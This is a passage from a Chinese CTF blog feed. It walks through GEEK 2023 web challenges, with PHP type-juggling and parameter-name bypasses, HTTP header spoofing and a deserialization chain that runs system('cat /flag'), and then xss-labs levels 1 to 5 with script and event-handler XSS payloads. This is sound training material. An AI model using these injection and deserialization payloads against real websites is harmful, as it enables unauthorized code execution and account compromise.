&amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;lover&#x27;</span>] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>]) &#123;<br>      <span class="hljs-variable">$array1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>];<br>      <span class="hljs-variable">$array2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>];<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array2</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="hljs-string">&quot;Happy to see you!&quot;</span>)) &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;再绕最后一步吧&quot;</span>;<br>        &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好哩，快拿到flag啦&quot;</span>;<br>      &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;这里绕不过去，QW可不答应了哈&quot;</span>;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;嘿嘿嘿，你别急啊&quot;</span>;<br>  &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>preg_match绕过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">isset</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;syc&#x27;</span>])</span></span>&amp;&amp;<span class="hljs-built_in">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;syc&#x27;</span>]</span>) &amp;&amp; $_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;syc&#x27;</span>]</span> !== <span class="hljs-string">&#x27;Welcome to GEEK 2023!&#x27;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">syc</span>=Welcome <span class="hljs-keyword">to</span> GEEK 2023!%0a<br></code></pre></td></tr></table></figure><p>intval绕过 </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">intval</span><span class="hljs-params">($_GET[<span class="hljs-string">&#x27;lover&#x27;</span>])</span></span> &lt; <span class="hljs-number">2023</span> &amp;&amp; <span class="hljs-built_in">intval</span>($_GET<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;lover&#x27;</span>]</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span><br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">echo <span class="hljs-built_in">intval</span>(<span class="hljs-number">1</span>e10);              <span class="hljs-comment">// 1410065408</span><br>echo <span class="hljs-built_in">intval</span>(&#x27;<span class="hljs-number">1</span>e10&#x27;);            <span class="hljs-comment">// 1</span><br>echo <span class="hljs-built_in">intval</span>(&#x27;<span class="hljs-number">1</span>e10&#x27;+<span class="hljs-number">1</span>);          <span class="hljs-comment">// 1410065409</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?l</span>over=<span class="hljs-string">&#x27;1e10&#x27;</span><br></code></pre></td></tr></table></figure><p>sha1绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>]) &#123;<br>      <span class="hljs-variable">$array1</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qw&#x27;</span>];<br>      <span class="hljs-variable">$array2</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;yxx&#x27;</span>];<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array1</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$array2</span>))<br></code></pre></td></tr></table></figure><p>数组绕过，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，所以经过加密后得到的都是NULL，也就是相等的。</p><p>payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-string">qw[]</span>=<span class="hljs-number">1</span>&amp;yxx[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">isset</span><span class="hljs-params">($_POST[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>])</span></span>&amp;&amp;($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;SYC_GEEK.2023&#x27;</span>]</span>=<span class="hljs-string">&quot;Happy to see you!&quot;</span><br></code></pre></td></tr></table></figure><p>在 PHP 中，变量名称中不能使用句号点（.）。 例如 <code>$a.b</code> 是一个不合法的变量名。因此，PHP 会自动将点替换为下划线。</p><p>除了点，一些其他字符如果出现在GET参数名中，也将会被自动替换为下划线。会被自动替换的字符列表：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>) ( ) (空格)<br><span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>) (.) (点)<br><span class="hljs-built_in">chr</span>(<span class="hljs-number">91</span>) ([) (中括号)<br><span class="hljs-built_in">chr</span>(<span class="hljs-number">128</span>) - <span class="hljs-built_in">chr</span>(<span class="hljs-number">159</span>) (多个字符)<br></code></pre></td></tr></table></figure><p>在 PHP 中，变量名称中不能使用句号点（.）。 例如 <code>$a.b</code> 是一个不合法的变量名。因此，PHP 会自动将点替换为下划线。</p><p>除了点，一些其他字符如果出现在GET参数名中，也将会被自动替换为下划线。会被自动替换的字符列表：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">chr</span>(<span class="hljs-number">32</span>) ( ) (空格)<br><span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>) (.) (点)<br><span class="hljs-built_in">chr</span>(<span class="hljs-number">91</span>) ([) (中括号)<br><span class="hljs-built_in">chr</span>(<span class="hljs-number">128</span>) - <span class="hljs-built_in">chr</span>(<span class="hljs-number">159</span>) (多个字符)<br></code></pre></td></tr></table></figure><p>payload：   </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">SYC[GEEK.<span class="hljs-number">2023</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;Happy to see you!&quot;</span><br></code></pre></td></tr></table></figure><h2 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h2><p>post传参username和password进行登录</p><p>搜到了robots.txt</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/o2takuXX&#x27;s_username_and_password.txt<br></code></pre></td></tr></table></figure><p>访问获得账户密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>admin<br><span class="hljs-symbol">password:</span>@dm1N123456r00t<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>必须来源自sycsec.com</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> sycsec.com<br></code></pre></td></tr></table></figure><p>请使用Syclover浏览器</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: Syclover<br></code></pre></td></tr></table></figure><p>请从localhost访问</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>-forwarded-for: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>请使用Syc.vip代理</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vi</span><span class="hljs-variable">a:Syc</span>.vip<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_O2TAKUXX&#x27;</span>]==<span class="hljs-string">&quot;GiveMeFlag&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">O2TAKUXX:</span> GiveMeFlag<br></code></pre></td></tr></table></figure><h2 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h2><p>反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>**highlight_file**(**<span class="hljs-keyword">__FILE__</span>**);<br>**<span class="hljs-class"><span class="hljs-keyword">class</span>** **<span class="hljs-title">syc</span>**</span><br><span class="hljs-class"></span>&#123;<br>    **<span class="hljs-keyword">public</span>** <span class="hljs-variable">$cuit</span>;<br>    **<span class="hljs-keyword">public</span>** **<span class="hljs-function"><span class="hljs-keyword">function</span>** **<span class="hljs-title">__destruct</span>**(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        **<span class="hljs-keyword">echo</span>**(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        **<span class="hljs-keyword">return</span>** <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br>**<span class="hljs-class"><span class="hljs-keyword">class</span>** **<span class="hljs-title">lover</span>**</span><br><span class="hljs-class"></span>&#123;<br>    **<span class="hljs-keyword">public</span>** <span class="hljs-variable">$yxx</span>;<br>    **<span class="hljs-keyword">public</span>** <span class="hljs-variable">$QW</span>;<br>    **<span class="hljs-keyword">public</span>** **<span class="hljs-function"><span class="hljs-keyword">function</span>** **<span class="hljs-title">__invoke</span>**(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        **<span class="hljs-keyword">echo</span>**(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        **<span class="hljs-keyword">return</span>** <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br>**<span class="hljs-class"><span class="hljs-keyword">class</span>** **<span class="hljs-title">web</span>**</span><br><span class="hljs-class"></span>&#123;<br>    **<span class="hljs-keyword">public</span>** <span class="hljs-variable">$eva1</span>;<br>    **<span class="hljs-keyword">public</span>** <span class="hljs-variable">$interesting</span>;<br><br>​    **<span class="hljs-keyword">public</span>** **<span class="hljs-function"><span class="hljs-keyword">function</span>** **<span class="hljs-title">__get</span>**(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">​    </span>&#123;<br>​        **<span class="hljs-keyword">echo</span>**(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>​        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>​        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>​    &#125;<br>&#125;<br>**<span class="hljs-keyword">if</span>** (**<span class="hljs-keyword">isset</span>**(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>​    **unserialize**(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><ul><li>__construct()：实例化对象时，首先会去自动执行的一个方法</li><li>__invoke()：格式表达错误导致没魔术方法触发（把对象当成函数调用）</li><li>__get()：调用的成员属性是私有属性或不存在时触发（返回值：不存在的成员属性的名称）</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new web();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">eva1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">interesting</span>=<span class="hljs-string">&quot;cat /flag&quot;</span>;<br><span class="hljs-variable">$b</span>=new lover();<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">yxx</span>=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">QW</span>=<span class="hljs-string">&#x27;asd&#x27;</span>;//赋一未知值来调用__get<br><span class="hljs-variable">$c</span>=new syc();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">cuit</span>=<span class="hljs-variable">$b</span>;//触发__invoke<br><br>echo serialize(<span class="hljs-variable">$c</span>);<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;cuit&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lover&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;yxx&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;eva1&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;interesting&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cat /flag&quot;</span>;&#125;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;QW&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asd&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h2><p>无参RCE</p><h2 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h2><p>文件上传</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-labs</title>
    <link href="/2023/10/30/%E5%88%B7%E9%A2%98/xss-labs/"/>
    <url>/2023/10/30/%E5%88%B7%E9%A2%98/xss-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><h2 id="level-1（url中get传参—JS弹窗函数alert-）"><a href="#level-1（url中get传参—JS弹窗函数alert-）" class="headerlink" title="level-1（url中get传参—JS弹窗函数alert()）"></a><strong>level-1（url中get传参—JS弹窗函数alert()）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/30/Af7p3.png" alt="image-20231030214920524"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&quot;&lt;/h2&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用get方式去获取name值，然后直接回显到浏览器当中。所以尝试直接插入payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="level-2（闭合绕过-）"><a href="#level-2（闭合绕过-）" class="headerlink" title="level-2（闭合绕过 ）"></a><strong>level-2（闭合绕过 ）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/30/AfQ8O.png" alt="image-20231030215003332"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.htmlspecialchars</span>(<span class="hljs-variable">$str</span>)<br><br>把 &lt; 和 &gt; 转换为实体,常用于防止浏览器将其用作 HTML 元素。当用户有权在您的页面上显示输入时，对于防止代码运行非常有用。<br></code></pre></td></tr></table></figure><p>直接提交<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>未弹窗</p><p>查看网页源码</p><p><img src="https://i0.imgs.ovh/2023/10/30/AfcAH.png" alt="image-20231030215325591"></p><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>标签之中的恶意代码被编码了。其中&lt;、&gt;都被编码成了html字符实体。</p><p>往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回的</p><p>只能从属性值中的恶意代码处进行突破了。要想浏览器执行这里的弹窗代码，只需要将属性的引号和标签先闭合就可以了。</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; //</span><br></code></pre></td></tr></table></figure><p>结果：<code>&lt;input name=keyword  value=&quot;&quot; &gt; &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; //&quot;&gt;</code></p><h2 id="level-3（onfocus-x2F-onBlur事件绕过）"><a href="#level-3（onfocus-x2F-onBlur事件绕过）" class="headerlink" title="level-3（onfocus&#x2F;onBlur事件绕过）"></a><strong>level-3（onfocus&#x2F;onBlur事件绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/30/AfesD.png" alt="image-20231030215712428"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&quot;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&#x27;&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&#x27;&gt;    </span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二关的漏洞被堵上</p><p><strong>onfocus&#x2F;onBlur事件绕过</strong></p><p>onFocus事件就是当光标落在文本框中时发生的事件。</p><p>onBlur事件是光标失去焦点时发生的事件。</p><p>总体思路就是，直接改造原有结构，赋予搜索按钮不同的用途。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27; onfocus=javascript:alert(&#x27;</span>x<span class="hljs-string">&#x27;) &#x27;</span><br></code></pre></td></tr></table></figure><p>成功，陷入了一个死循环，点击输入框，输入框获得焦点，触发alert，这个时候输入框失去焦点，但是点击确定以后输入框就又获得了焦点，又再次弹出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27; onBlur=javascript:alert(&#x27;</span>x<span class="hljs-string">&#x27;) &#x27;</span><br></code></pre></td></tr></table></figure><h2 id="level-4（onfocus-x2F-onBlur事件绕过）"><a href="#level-4（onfocus-x2F-onBlur事件绕过）" class="headerlink" title="level-4（onfocus&#x2F;onBlur事件绕过）"></a><strong>level-4（onfocus&#x2F;onBlur事件绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/30/AfUNX.png" alt="image-20231030221253810"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先将变量捕获，替换&lt;&gt;为空字符，再利用htmlspecialchars函数“净化”。还是上一关的姿势，只不过上一关当中注释是用的单引号，这一关换双引。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot; onBlur=javascript:alert(&#x27;x&#x27;) &quot;</span><br></code></pre></td></tr></table></figure><h2 id="level-5（href标签构建）"><a href="#level-5（href标签构建）" class="headerlink" title="level-5（href标签构建）"></a><strong>level-5（href标签构建）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/30/AfjpU.png" 